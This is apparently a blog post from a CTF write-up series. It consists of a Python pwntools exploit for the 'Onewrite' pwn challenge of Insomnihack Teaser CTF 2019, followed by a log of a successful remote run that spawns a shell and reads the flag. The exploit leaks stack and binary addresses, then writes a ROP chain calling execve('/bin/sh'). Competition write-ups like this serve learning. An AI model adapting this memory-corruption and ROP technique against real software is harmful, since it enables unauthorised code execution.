---
title: Insomnihack Teaser CTF 2019
date: 2019-01-20 19:21:38 -0500
categories: [CTF]
tags: [ctf, pwn]
author: Duc Phan
excerpt-separator: <!--more-->
---

This is my exploit for the Onewrite challenge from Insomnihack Teaser CTF 2019.

<!--more-->

## Onewrite - Pwn

```python
from __future__ import print_function
from pwn import *
import os

GDBSCRIPT = """
"""
HOST = 'onewrite.teaser.insomnihack.ch'
PORT = 1337
BIN = './onewrite'

PROMPT = "> "
STACK = "1"
PIE = "2"
ADDR = "address : "
DATA = "data : "

e = ELF(BIN)
addrs = {
    'poprax': 0x460ac,
    'poprdxrsi': 0x484e9,
    'poprdi': 0x84fa,
    'syscall': 0x6e605,
    'poprsp': 0x946a
}

if os.environ.has_key('remote'):
    r = remote(HOST, PORT)
else:
    r = process(e.path)

if os.environ.has_key('debug'):
    gdb.attach(r, gdbscript=GDBSCRIPT)

def overwrite(addr, data, prompt=True):
    r.recvuntil(ADDR)
    r.send(str(addr))
    r.recvuntil(DATA)
    r.send(data)
    if prompt:
        r.recvuntil(PROMPT)
        r.sendline("")

def main():
    # Leak stack and return to do_leak
    r.recvuntil(PROMPT)
    r.sendline(STACK)
    stackleak = int(r.recvuntil("\n"), 16)
    print("stack @ {:#08x}".format(stackleak))

    overwrite(stackleak - 0x8, '\x15', prompt=False)

    # Leak binary
    r.recvuntil(PROMPT)
    r.sendline(PIE)
    binleak = int(r.recvuntil("\n"), 16)
    binbase = binleak - e.symbols['do_leak']
    # Rebase after leak
    for k in addrs.keys():
        addrs[k] += binbase
    print("do_leak @ {:#08x}".format(binleak))
    print("binbase @ {:#08x}".format(binbase))

    # Then keep overwriting it with do_leak
    # At some point, we need to overwrite that 0 too
    # Then do_leak will be called consecutively
    
    # Overwrite first time
    nOverwrite = 9
    writeaddr = stackleak - 0x8
    for i in range(nOverwrite):
        log.info("Overwriting {}".format(i))
        writeaddr -= 0x18
        overwrite(writeaddr, p64(binleak))

    writeaddr += 0x8
    for i in range(nOverwrite - 2):
        log.info("Overwriting reverse {}".format(i))
        overwrite(writeaddr, p64(binleak))
        writeaddr += 0x18    

    # ropchain
    # pop rsp
    # ropchain address

    # x          : /bin/sh
    # x + 0x08   : 0

    # pop rax
    # 59
    # pop rdx; pop rsi
    # 0
    # 0
    # pop rdi
    # x
    # syscall

    ropaddr = stackleak + 0x30
    overwrite(writeaddr, p64(addrs['poprsp']))
    overwrite(writeaddr + 0x8, p64(ropaddr))

    binshaddr = stackleak + 0x10
    overwrite(binshaddr, "/bin/sh\x00")
    overwrite(binshaddr + 0x08, p64(0))
    log.info("Write arguments done")

    ropchain = p64(addrs['poprax'])
    ropchain += p64(59)
    ropchain += p64(addrs['poprdxrsi'])
    ropchain += p64(0)
    ropchain += p64(0)
    ropchain += p64(addrs['poprdi'])
    ropchain += p64(binshaddr)
    ropchain += p64(addrs['syscall'])
    ropchain += p64(binleak)

    for i in range(0, 9):
        overwrite(ropaddr + i * 8, ropchain[i * 8 : (i + 1) * 8])
    log.info("Write ropchain done")
    for _ in range(4):
        r.recvuntil(" : ")
        r.sendline("")
    
    r.interactive()
    r.close()

if __name__ == '__main__':
    main()


# 1 -> 2 before 0
# 2 -> 4 before 0 the second time

# 0x7fffffffdf08
# 0x7fffffffdef0 0x7fffffffdef8
# 0x7fffffffded8 0x7fffffffdee0
# 0x7fffffffdec0 0x7fffffffdec8
# 0x7fffffffdea8 0x7fffffffdeb0
# 0x7fffffffde90 0x7fffffffde98
```

```bash
➜  insonimhack remote=1 python exploit.py
[!] Did not find any GOT entries
[*] '/home/me/tmp/insonimhack/onewrite'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to onewrite.teaser.insomnihack.ch on port 1337: Done
stack @ 0x7fff4b937ca0
{'poprdxrsi': 140562253915369, 'syscall': 140562254071301, 'poprsp': 140562253657194, 'poprax': 140562253906092, 'poprdi': 140562253653242}
do_leak @ 0x7fd73332aa15
binbase @ 0x7fd733322000
[*] Overwriting 0
[*] Overwriting 1
[*] Overwriting 2
[*] Overwriting 3
[*] Overwriting 4
[*] Overwriting 5
[*] Overwriting 6
[*] Overwriting 7
[*] Overwriting 8
[*] Overwriting 9
[*] Overwriting reverse 0
[*] Overwriting reverse 1
[*] Overwriting reverse 2
[*] Overwriting reverse 3
[*] Overwriting reverse 4
[*] Overwriting reverse 5
[*] Overwriting reverse 6
[*] Overwriting reverse 7
[*] Write arguments done
[*] Write ropchain done
0x7fd733390605
What do you want to leak ?
1. stack
2. pie
 > Nope
address : $ 
data : $ 
What do you want to leak ?
1. stack
2. pie
 > Nope
address : $ 
data : $ 
$ ls -la
total 96
drwxr-xr-x  23 root root  4096 Jan 19 11:01 .
drwxr-xr-x  23 root root  4096 Jan 19 11:01 ..
drwxr-xr-x   2 root root  4096 Jan 19 10:59 bin
drwxr-xr-x   4 root root  4096 Jan 19 11:00 boot
drwxr-xr-x  16 root root  3620 Jan 19 11:01 dev
drwxr-xr-x  95 root root  4096 Jan 19 11:55 etc
drwxr-xr-x  14 root root  4096 Jan 19 11:55 home
lrwxrwxrwx   1 root root    31 Dec 22 16:30 initrd.img -> boot/initrd.img-4.15.0-1026-gcp
lrwxrwxrwx   1 root root    31 Dec 22 16:30 initrd.img.old -> boot/initrd.img-4.15.0-1026-gcp
drwxr-xr-x  20 root root  4096 Dec 22 16:29 lib
drwxr-xr-x   2 root root  4096 Dec 22 15:52 lib64
drwx------   2 root root 16384 Dec 22 16:09 lost+found
drwxr-xr-x   2 root root  4096 Dec 22 15:52 media
drwxr-xr-x   2 root root  4096 Dec 22 15:52 mnt
drwxr-xr-x   2 root root  4096 Dec 22 15:52 opt
dr-xr-xr-x 105 root root     0 Jan 19 11:01 proc
drwx------   4 root root  4096 Jan 19 11:45 root
drwxr-xr-x  25 root root   960 Jan 20 06:45 run
drwxr-xr-x   2 root root 12288 Jan 19 10:59 sbin
drwxr-xr-x   5 root root  4096 Jan 19 10:49 snap
drwxr-xr-x   2 root root  4096 Dec 22 15:52 srv
dr-xr-xr-x  13 root root     0 Jan 19 11:04 sys
drwxrwxrwt  10 root root  4096 Jan 20 23:35 tmp
drwxr-xr-x  10 root root  4096 Dec 22 15:52 usr
drwxr-xr-x  13 root root  4096 Dec 22 15:59 var
lrwxrwxrwx   1 root root    28 Dec 22 16:30 vmlinuz -> boot/vmlinuz-4.15.0-1026-gcp
lrwxrwxrwx   1 root root    28 Dec 22 16:30 vmlinuz.old -> boot/vmlinuz-4.15.0-1026-gcp
$ cd /home
$ ls -la
total 56
drwxr-xr-x 14 root      root      4096 Jan 19 11:55 .
drwxr-xr-x 23 root      root      4096 Jan 19 11:01 ..
drwxr-x---  3 awe       awe       4096 Jan 19 10:48 awe
drwxr-x---  3 blaklis   blaklis   4096 Jan 19 10:48 blaklis
drwxr-x---  3 boogy     boogy     4096 Jan 19 10:48 boogy
drwxr-x---  3 coolz0r   coolz0r   4096 Jan 19 10:48 coolz0r
drwxr-xr-x  3 daniel    daniel    4096 Jan 19 11:55 daniel
drwxr-x---  3 drp3ab0dy drp3ab0dy 4096 Jan 19 10:48 drp3ab0dy
drwxr-x---  3 eboda     eboda     4096 Jan 19 10:48 eboda
drwxr-x---  5 grimmlin  grimmlin  4096 Jan 19 11:00 grimmlin
drwxr-xr-x  2 root      root      4096 Jan 19 10:56 onewrite
drwxr-x---  3 thomas    thomas    4096 Jan 19 10:48 thomas
drwxr-x---  3 ubuntu    ubuntu    4096 Jan 19 10:48 ubuntu
drwxr-x---  3 vlad      vlad      4096 Jan 19 10:48 vlad
$ cd onewrite
$ ls -la
total 1004
drwxr-xr-x  2 root root    4096 Jan 19 10:56 .
drwxr-xr-x 14 root root    4096 Jan 19 11:55 ..
-rw-r--r--  1 root root     220 Apr  4  2018 .bash_logout
-rw-r--r--  1 root root    3771 Apr  4  2018 .bashrc
-rw-r--r--  1 root root     807 Apr  4  2018 .profile
-rw-r--r--  1 root root      48 Jan 19 10:56 flag
-rwxr-xr-x  1 root root 1000800 Jan 19 10:56 onewrite
$ cat flag
INS{one leak, one write, many possibilities...}
$  
```